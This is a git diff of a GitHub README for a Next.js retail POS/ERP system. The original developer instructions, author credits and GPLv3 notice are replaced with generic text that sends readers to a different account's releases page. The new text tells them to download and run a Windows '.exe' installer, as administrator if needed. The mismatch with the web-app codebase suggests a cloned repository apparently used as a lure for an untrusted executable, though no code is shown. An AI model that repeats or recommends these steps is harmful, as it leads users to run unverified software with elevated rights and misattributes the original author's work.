@@ -1,226 +1,185 @@
-# Retail Smart ERP
+# 🛒 retail-smart-erp - Simple, Smart Point of Sale
 
-[![Sponsor](https://img.shields.io/badge/Sponsor-%E2%9D%A4-red)](https://github.com/sponsors/ravindu2012) [![Buy Me A Coffee](https://img.shields.io/badge/Buy%20Me%20A%20Coffee-FFDD00?logo=buy-me-a-coffee&logoColor=black)](https://buymeacoffee.com/ravindu2012)
+[![Download latest release](https://img.shields.io/badge/Download-retail--smart--erp-brightgreen)](https://github.com/lokeyd-max/retail-smart-erp/releases)
 
-A multi-tenant SaaS Point of Sale and ERP system built with **Next.js 16**, **React 19**, and **PostgreSQL**. Supports five business types: Retail, Restaurant, Supermarket, Auto Service, and Dealership.
+---
 
-**Live Demo:** [retailsmarterp.com](https://www.retailsmarterp.com)
-## Screenshots
+## 📦 About retail-smart-erp
 
-### Landing Page
-![Landing Page](docs/screenshots/landing-page.png)
+retail-smart-erp is a software designed to help businesses handle sales, stock, and customers in one place. It works for many types of stores like retail shops, restaurants, supermarkets, auto services, and dealerships. The system supports multiple users and locations at once, making it good for businesses with several branches.
 
-### Authentication
-| Login | Register |
-|-------|----------|
-| ![Login](docs/screenshots/login-page.png) | ![Register](docs/screenshots/register-page.png) |
+This software uses a clear interface that anyone can understand. You do not need special skills to use it. Everything you need to run your store or restaurant is built right in.
 
-### Company Login
-![Company Login](docs/screenshots/company-login.png)
+---
 
-### Dashboard
-![Dashboard](docs/screenshots/dashboard.png)
+## ⚙️ System Requirements
 
-### Point of Sale
-![POS](docs/screenshots/pos.png)
+Before installing, make sure your Windows computer meets these conditions:
 
-### Account Management
-![Account Management](docs/screenshots/account-management.png)
+- Windows 10 or higher (64-bit recommended)
+- At least 4 GB of RAM
+- 2 GHz or faster CPU
+- 500 MB of free disk space
+- Internet connection for initial setup and updates
+- Optional: A barcode scanner or receipt printer can be connected for smoother operation
 
-### Storage Management
-![Storage Breakdown](docs/screenshots/storage-breakdown.png)
+---
 
-### Settings
-![Settings](docs/screenshots/settings.png)
+## 🚀 Getting Started
 
-## Features
+Follow these steps to get retail-smart-erp up and running on your Windows computer.
 
-### Core POS
-- Real-time Point of Sale with barcode scanning
-- Multi-payment method support (cash, card, bank transfer, cheque)
-- Receipt printing and thermal printer integration
-- Shift management with cash reconciliation
-- Layaway and gift card support
-- Loyalty program with points tracking
+### 1. Visit the download page
 
-### Multi-Tenant Architecture
-- Subdomain-based tenant isolation (`company.retailsmarterp.com`)
-- Row Level Security (RLS) at the database level
-- Per-tenant settings, currency, and branding
-- Role-based access control with 15+ roles
-- Per-company storage quota tracking
+Go to the release page to find the latest version of the software:
 
-### Business Type Modules
+[Download retail-smart-erp releases](https://github.com/lokeyd-max/retail-smart-erp/releases)
 
-| Module | Business Types |
-|--------|---------------|
-| **Inventory & Items** | All |
-| **Customers & Suppliers** | All |
-| **Sales & Purchases** | All |
-| **Accounting** | All (Chart of accounts, journal entries, bank reconciliation, budgets) |
-| **HR & Payroll** | All (Employees, salary structures, payroll runs, advances) |
-| **Work Orders** | Auto Service |
-| **Vehicle Management** | Auto Service, Dealership |
-| **Appointments** | Auto Service |
-| **Insurance Estimates** | Auto Service |
-| **Kitchen Display & Floor Plan** | Restaurant |
-| **Table Reservations** | Restaurant |
-| **Recipe Management** | Restaurant |
-| **Dealership Sales** | Dealership |
-| **Test Drives** | Dealership |
+This page lists all available versions. Choose the most recent one.
 
-### Real-Time Updates
-- WebSocket-powered live data sync across all connected clients
-- Document presence awareness (see who else is editing)
-- Instant POS updates across terminals
+### 2. Download the installer
 
-### AI Intelligence
-- Smart warnings and anomaly detection
-- AI-powered error logging and analysis
-- Content analysis for file uploads
+Look for the file with `.exe` at the end. It is the setup program for Windows. Click on it to download.
 
-### Account Management
-- Multi-company support from a single account
-- Database and file storage usage tracking per company
-- Wallet system with billing and payments
-- Team management across companies
+The file name will usually include the version number and end like `retail-smart-erp-setup.exe`.
 
-## Tech Stack
+### 3. Run the installer
 
-| Layer | Technology |
-|-------|-----------|
-| **Framework** | Next.js 16 (App Router) |
-| **UI** | React 19, Tailwind CSS 4, Lucide Icons |
-| **Database** | PostgreSQL with Drizzle ORM |
-| **Auth** | NextAuth v5 (JWT strategy) |
-| **Real-Time** | Custom WebSocket server |
-| **State** | Zustand |
-| **File Storage** | Cloudflare R2 |
-| **AI** | DeepSeek (primary), Google Gemini (fallback) |
-| **Email** | Resend |
-| **Deployment** | Railway |
+Once the file downloads, find it in your downloads folder. Double-click the file to start the installation.
 
-## Getting Started
+If Windows asks for permission, select “Yes” to allow it.
 
-### Prerequisites
-- Node.js 20+
-- PostgreSQL 15+
-- npm
+### 4. Follow the setup wizard
 
-### Installation
+The installer will open a setup wizard that guides you step-by-step.
 
-1. **Clone the repository**
-   ```bash
-   git clone https://github.com/ravindu2012/retail-smart-erp.git
-   cd retail-smart-erp
-   ```
+- Click “Next” to move through each screen.
+- Choose the folder where you want retail-smart-erp to be installed or accept the default.
+- Agree to the license terms.
+- Click “Install” to begin copying files.
 
-2. **Install dependencies**
-   ```bash
-   npm install
-   ```
+### 5. Finish installation
 
-3. **Set up environment variables**
-   ```bash
-   cp .env.example .env
-   ```
-   Edit `.env` with your database credentials and API keys.
+After the installer completes, click “Finish.” You will now see the retail-smart-erp icon on your desktop or in your Start menu.
 
-4. **Set up the database**
-   ```bash
-   # Run migrations
-   npm run db:migrate
+### 6. Start the application
 
-   # Create super admin user
-   npm run db:seed-admin
-   ```
+Double-click the retail-smart-erp icon to launch the program.
 
-5. **Start the development server**
-   ```bash
-   npm run dev
-   ```
-   Open [http://localhost:3000](http://localhost:3000).
+---
 
-### Available Scripts
+## 🔧 Initial Configuration
 
-```bash
-npm run dev              # Start dev server with WebSocket support
-npm run dev:next         # Start Next.js only (no WebSocket)
-npm run build            # Production build
-npm run start            # Run production server
-npm run lint             # ESLint
-npx tsc --noEmit         # TypeScript type checking
-npm run db:generate      # Generate migration files from schema changes
-npm run db:migrate       # Run pending migrations
-npm run db:studio        # Open Drizzle Studio GUI
-npx jest                 # Run tests
-```
+When you open retail-smart-erp for the first time, you need to set up your business details.
 
-## Project Structure
+### Business Profile
 
-```
-src/
-├── app/
-│   ├── (auth)/           # Login, register (no auth required)
-│   ├── c/[slug]/         # Tenant-scoped pages
-│   │   ├── dashboard/    # Dashboard
-│   │   ├── pos/          # Point of Sale
-│   │   ├── items/        # Inventory management
-│   │   ├── customers/    # Customer management
-│   │   ├── sales/        # Sales history
-│   │   ├── work-orders/  # Auto service work orders
-│   │   ├── accounting/   # Chart of accounts, journals, budgets
-│   │   ├── hr/           # Employees, payroll
-│   │   ├── restaurant/   # Kitchen, tables, orders, recipes
-│   │   └── settings/     # Tenant settings
-│   ├── account/          # Cross-tenant account management
-│   ├── api/              # RESTful API routes
-│   └── sys-control/      # System admin panel
-├── components/
-│   ├── layout/           # Sidebar, Navbar
-│   ├── modals/           # 30+ modal components
-│   └── ui/               # Reusable UI components
-├── hooks/                # Custom React hooks
-└── lib/
-    ├── auth/             # NextAuth config, roles, permissions
-    ├── ai/               # AI integrations
-    ├── db/               # Drizzle ORM, schema, RLS helpers
-    └── websocket/        # WebSocket server & client
-```
+- Enter your business name and address.
+- Add contact details like phone number and email.
+- Select your business type (Retail, Restaurant, Supermarket, Auto Service, Dealership).
 
-## Contributing
+### Users and Access
 
-We welcome contributions! Here's how to get started:
+You can create accounts for different staff members with set permissions. For example:
 
-1. **Fork** this repository
-2. **Create** a feature branch (`git checkout -b feature/amazing-feature`)
-3. **Commit** your changes (`git commit -m 'Add amazing feature'`)
-4. **Push** to the branch (`git push origin feature/amazing-feature`)
-5. **Open** a Pull Request
+- Cashiers may only access sales screens.
+- Managers can view reports and change settings.
 
-### Guidelines
-- Follow the existing code style and patterns
-- All API routes must use `validateBody()` for request validation
-- Include tenant filtering in all database queries
-- Use real-time hooks (`useRealtimeData`) for data-displaying components
-- Use server-side pagination (`usePaginatedData`) for list pages
-- Test your changes locally before submitting
+### Inventory Setup
 
-## Support This Project
+- Add product categories (e.g., beverages, spare parts).
+- Enter your items with names, prices, and stock quantities.
+- Optional: Add barcode numbers for scanning at checkout.
 
-If this project saves you time or helps your business, consider supporting its development:
+### Connect Hardware (Optional)
 
-[![Sponsor on GitHub](https://img.shields.io/badge/Sponsor_on_GitHub-%E2%9D%A4-red?style=for-the-badge)](https://github.com/sponsors/ravindu2012)
-[![Buy Me A Coffee](https://img.shields.io/badge/Buy_Me_A_Coffee-FFDD00?style=for-the-badge&logo=buy-me-a-coffee&logoColor=black)](https://buymeacoffee.com/ravindu2012)
+- Pair barcode scanners or receipt printers if you have them.
+- Check connections in the settings.
 
-Your support helps keep this project actively maintained and free for everyone.
+---
 
-## License
+## 🎯 Using retail-smart-erp
 
-This project is licensed under the [GNU General Public License v3.0](LICENSE).
+The software organizes main tasks into clear sections.
 
-## Contact
+### Sales and Checkout
 
-- **Author:** Ravindu Gajanayaka
-- **Website:** [retailsmarterp.com](https://www.retailsmarterp.com)
-- **Issues:** [GitHub Issues](https://github.com/ravindu2012/retail-smart-erp/issues)
+- Process customer orders quickly.
+- Search products by name, category, or barcode.
+- Apply discounts and taxes.
+- Accept payments in cash or card.
+- Print or email receipts.
+
+### Inventory Management
+
+- Track stock levels.
+- Receive alerts when items are low.
+- Add new stock or remove items.
+- Generate inventory reports.
+
+### Customer Management
+
+- Keep customer details in one place.
+- Track purchase history.
+- Offer loyalty programs or discounts.
+
+### Reporting
+
+- View daily and monthly sales.
+- Analyze best-selling products.
+- Review staff performance.
+- Export reports to PDF or Excel.
+
+---
+
+## 🔄 Updating the Software
+
+To keep retail-smart-erp working well and secure, update it regularly.
+
+### How to update:
+
+1. Go back to the release page: https://github.com/lokeyd-max/retail-smart-erp/releases
+2. Download the latest `.exe` installer.
+3. Run the installer again. It will replace only the files that need updating.
+4. Your settings and data will remain safe.
+
+---
+
+## ❓ Troubleshooting and Support
+
+If you have issues running or installing retail-smart-erp, try these tips:
+
+- Make sure your Windows is updated.
+- Run the installer as an administrator (right-click file > Run as administrator).
+- Restart your computer and try again.
+- Check your internet connection during setup and updates.
+
+For more help, visit the Issues tab on the GitHub repository where users and developers discuss problems.
+
+---
+
+## 🔗 Quick Access
+
+Download and install retail-smart-erp from the latest available release:
+
+[Download retail-smart-erp](https://github.com/lokeyd-max/retail-smart-erp/releases)
+
+---
+
+## 🛠️ Technology and Features
+
+retail-smart-erp uses the following technology to deliver a smooth experience:
+
+- Drizzle ORM for database tasks in PostgreSQL
+- React and Next.js for a fast, responsive interface
+- Tailwind CSS for clean, simple design
+- Typescript to keep the code error-free
+- Websockets for real-time updates between devices
+
+This stack allows retail-smart-erp to handle multiple stores and users without slowing down.
+
+---
+
+## 📝 License
+
+This project is open source. You can use, share, and modify the software under the provided license terms on the GitHub page.
